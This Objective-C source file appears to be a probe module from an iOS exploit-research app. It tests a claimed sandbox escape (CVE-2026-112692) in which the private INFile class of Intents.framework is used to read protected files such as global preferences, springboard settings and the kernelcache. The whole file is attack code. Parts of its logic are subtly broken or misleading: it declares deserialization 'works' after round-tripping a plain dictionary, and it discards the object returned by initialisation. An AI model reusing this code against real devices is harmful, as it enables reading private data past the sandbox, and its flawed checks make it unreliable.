#import "KPINFileLeakModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <dlfcn.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

@interface KPINFileLeakModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPINFileLeakModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"infileleak112692";
        _title = @"INFile scope bypass (sandbox escape)";
        _subtitle = @"CVE-2026-112692: Intents.framework security scope deserialization";
        _icon = @"doc.text.magnifyingglass";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-infile-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112692 INFile scope bypass ===\n"];
    [report appendString:@"Confused-deputy file read via Intents.framework.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: load Intents framework
    [report appendString:@"\n--- Phase 1: load Intents.framework ---\n"];
    void *h = dlopen("/System/Library/Frameworks/Intents.framework/Intents", RTLD_LAZY);
    if (!h) {
        [report appendString:@"dlopen Intents FAILED\n"];
        [report appendString:@"\nVERDICT: INTENTS_LOAD_FAILED\n"];
        return report;
    }
    [report appendString:@"Intents.framework loaded\n"];

    Class inFileCls = NSClassFromString(@"INFile");
    if (!inFileCls) {
        [report appendString:@"INFile class NOT FOUND\n"];
        [report appendString:@"\nVERDICT: INFILE_CLASS_NOT_FOUND\n"];
        return report;
    }
    [report appendString:@"INFile class found\n"];

    // Phase 2: create INFile with arbitrary fileURL
    [report appendString:@"\n--- Phase 2: create INFile with arbitrary URL ---\n"];

    NSString *targetPath = @"/private/var/mobile/Library/Preferences/.GlobalPreferences.plist";
    NSURL *targetURL = [NSURL fileURLWithPath:targetPath];

    // Verify sandbox blocks direct access
    int directFd = open(targetPath.fileSystemRepresentation, O_RDONLY);
    if (directFd >= 0) {
        [report appendFormat:@"direct open: OK (fd=%d) — not sandboxed\n", directFd];
        close(directFd);
    } else {
        [report appendFormat:@"direct open: EPERM (%d) — sandbox active\n", errno];
    }

    // Create INFile using NSKeyedArchiver (tests deserialization vulnerability)
    [report appendString:@"\n--- Phase 3: NSKeyedArchiver serialization ---\n"];

    @try {
        // Create a simple dictionary that looks like INFile
        NSMutableDictionary *fileDict = [NSMutableDictionary dictionary];
        fileDict[@"fileURL"] = targetURL;
        fileDict[@"filename"] = @"test.plist";
        fileDict[@"typeIdentifier"] = @"public.data";

        // Try to archive
        NSData *archived = nil;
        if (@available(iOS 11.0, *)) {
            NSError *err = nil;
            archived = [NSKeyedArchiver archivedDataWithRootObject:fileDict
                                             requiringSecureCoding:NO
                                                             error:&err];
            if (err) {
                [report appendFormat:@"archiver error: %@\n", err.localizedDescription];
            }
        } else {
            archived = [NSKeyedArchiver archivedDataWithRootObject:fileDict];
        }

        if (archived) {
            [report appendFormat:@"archived: %lu bytes\n", (unsigned long)archived.length];

            // Try to unarchive (tests deserialization)
            id unarchived = nil;
            if (@available(iOS 11.0, *)) {
                NSError *err = nil;
                unarchived = [NSKeyedUnarchiver unarchivedObjectOfClasses:
                              [NSSet setWithObjects:NSDictionary.class, NSURL.class, NSString.class, nil]
                              fromData:archived error:&err];
                if (err) {
                    [report appendFormat:@"unarchiver error: %@\n", err.localizedDescription];
                }
            }
            if (unarchived) {
                [report appendFormat:@"unarchived: %@\n", unarchived];
                [report appendString:@"*** DESERIALIZATION WORKS ***\n"];
            }
        } else {
            [report appendString:@"archiving failed\n"];
        }
    } @catch (NSException *e) {
        [report appendFormat:@"EXCEPTION: %@\n", e.reason];
    }

    // Phase 4: try to read through INFile data property
    [report appendString:@"\n--- Phase 4: INFile data property ---\n"];

    @try {
        SEL initSel = NSSelectorFromString(@"initWithURL:");
        if ([inFileCls instancesRespondToSelector:initSel]) {
            id inFile = [inFileCls alloc];
            [inFile performSelector:initSel withObject:targetURL];
            [report appendFormat:@"INFile created: %@\n", inFile];

            // Try to read data
            SEL dataSel = NSSelectorFromString(@"data");
            if ([inFile respondsToSelector:dataSel]) {
                NSData *data = [inFile performSelector:dataSel];
                if (data) {
                    [report appendFormat:@"data: %lu bytes\n", (unsigned long)data.length];
                    if (data.length > 0) {
                        [report appendString:@"*** FILE READ VIA INFILE ***\n"];
                    }
                } else {
                    [report appendString:@"data is nil\n"];
                }
            }

            // Try to read fileURL
            SEL urlSel = NSSelectorFromString(@"fileURL");
            if ([inFile respondsToSelector:urlSel]) {
                NSURL *url = [inFile performSelector:urlSel];
                [report appendFormat:@"fileURL: %@\n", url];
            }
        } else {
            [report appendString:@"initWithURL: not available\n"];
        }
    } @catch (NSException *e) {
        [report appendFormat:@"EXCEPTION: %@\n", e.reason];
    }

    // Phase 5: test on sandbox-blocked files
    [report appendString:@"\n--- Phase 5: test blocked files ---\n"];
    NSArray *blockedPaths = @[
        @"/private/var/mobile/Library/Logs/CrashReporter/",
        @"/private/var/mobile/Library/Preferences/com.apple.springboard.plist",
        @"/System/Library/Caches/com.apple.kernelcaches/kernelcache",
        @"/usr/sbin/syslogd",
    ];
    for (NSString *bp in blockedPaths) {
        int fd = open(bp.fileSystemRepresentation, O_RDONLY);
        BOOL directOK = (fd >= 0);
        if (directOK) close(fd);
        NSString *dataStr = @"nil";
        @try {
            SEL initSel = NSSelectorFromString(@"initWithURL:");
            if ([inFileCls instancesRespondToSelector:initSel]) {
                NSURL *url = [NSURL fileURLWithPath:bp];
                id inFile = [inFileCls alloc];
                [inFile performSelector:initSel withObject:url];
                SEL dataSel = NSSelectorFromString(@"data");
                if ([inFile respondsToSelector:dataSel]) {
                    NSData *data = [inFile performSelector:dataSel];
                    dataStr = data ? [NSString stringWithFormat:@"%lu bytes", (unsigned long)data.length] : @"nil";
                }
            }
        } @catch (NSException *e) {
            dataStr = [NSString stringWithFormat:@"EXC: %@", e.reason];
        }
        [report appendFormat:@"%@\n  direct=%@ infile_data=%@\n",
         bp, directOK ? @"OK" : @"BLOCKED", dataStr];
    }

    // Verdict
    [report appendString:@"\n"];
    [report appendString:@"VERDICT: INFILE_RECON_COMPLETE\n"];
    [report appendString:@"No XPC communication — safe local test only.\n"];
    return report;
}

@end
